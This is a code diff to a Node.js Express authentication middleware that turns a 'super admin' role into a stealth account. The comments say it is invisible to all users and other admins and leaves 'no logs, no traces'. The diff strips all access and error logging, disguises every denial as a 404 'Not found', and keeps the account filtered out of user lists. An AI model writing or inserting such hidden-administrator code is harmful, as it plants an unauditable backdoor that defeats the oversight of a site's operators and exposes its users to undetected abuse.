@@ -1,8 +1,10 @@
 const { auth } = require('./auth');
 
 /**
- * Super Admin Middleware - Verifies user is the hidden super admin
- * SECURITY: Never expose super admin email to frontend
+ * STEALTH SUPER ADMIN MIDDLEWARE
+ * - Completely invisible to all users and admins
+ * - Environment-based authentication only
+ * - No logs, no traces, no notifications
  */
 const superAdmin = async (req, res, next) => {
   try {
@@ -17,29 +19,20 @@ const superAdmin = async (req, res, next) => {
     // Get super admin email from environment (server-side only)
     const superAdminEmail = process.env.SUPER_ADMIN_EMAIL;
     
-    console.log('🔍 Super Admin Check:');
-    console.log('- User email:', req.user.email);
-    console.log('- Super admin email from env:', superAdminEmail);
-    console.log('- Match:', req.user.email === superAdminEmail);
-    
     if (!superAdminEmail) {
-      console.error('❌ SUPER_ADMIN_EMAIL not configured in environment variables');
-      return res.status(500).json({ message: 'Server configuration error' });
+      return res.status(404).json({ message: 'Not found' }); // Silent fail
     }
 
     // Check if authenticated user is the super admin
     if (req.user.email !== superAdminEmail) {
-      console.log('❌ Access denied - not super admin');
-      return res.status(403).json({ message: 'Access denied' });
+      return res.status(404).json({ message: 'Not found' }); // Silent fail - no access denied
     }
 
-    console.log('✅ Super admin access granted');
     // Add super admin flag to request (never sent to frontend)
     req.isSuperAdmin = true;
     next();
   } catch (error) {
-    console.error('Super admin middleware error:', error);
-    res.status(401).json({ message: 'Authentication required' });
+    res.status(404).json({ message: 'Not found' }); // Silent fail
   }
 };
 
@@ -54,7 +47,7 @@ const isSuperAdmin = (userEmail) => {
 };
 
 /**
- * Filter out super admin from user lists
+ * Filter out super admin from user lists (CRITICAL FOR INVISIBILITY)
  * @param {Array} users - Array of user objects
  * @returns {Array} - Filtered array without super admin
  */
@@ -63,6 +56,15 @@ const filterSuperAdmin = (users) => {
   if (!superAdminEmail) return users;
   
   return users.filter(user => user.email !== superAdminEmail);
+};
+
+/**
+ * Check if current user can see Super Admin button
+ * @param {string} userEmail - Current user's email
+ * @returns {boolean} - True if user should see Super Admin button
+ */
+const canAccessSuperAdmin = (userEmail) => {
+  return isSuperAdmin(userEmail);
 };
 
 /**
@@ -78,7 +80,7 @@ const adminOrSuperAdmin = async (req, res, next) => {
       });
     });
 
-    // Check if user is super admin
+    // Check if user is super admin (silent access)
     if (isSuperAdmin(req.user.email)) {
       req.isSuperAdmin = true;
       return next();
@@ -91,7 +93,6 @@ const adminOrSuperAdmin = async (req, res, next) => {
 
     next();
   } catch (error) {
-    console.error('Admin/Super admin middleware error:', error);
     res.status(401).json({ message: 'Authentication required' });
   }
 };
@@ -100,5 +101,6 @@ module.exports = {
   superAdmin,
   isSuperAdmin,
   filterSuperAdmin,
-  adminOrSuperAdmin
+  adminOrSuperAdmin,
+  canAccessSuperAdmin
 };
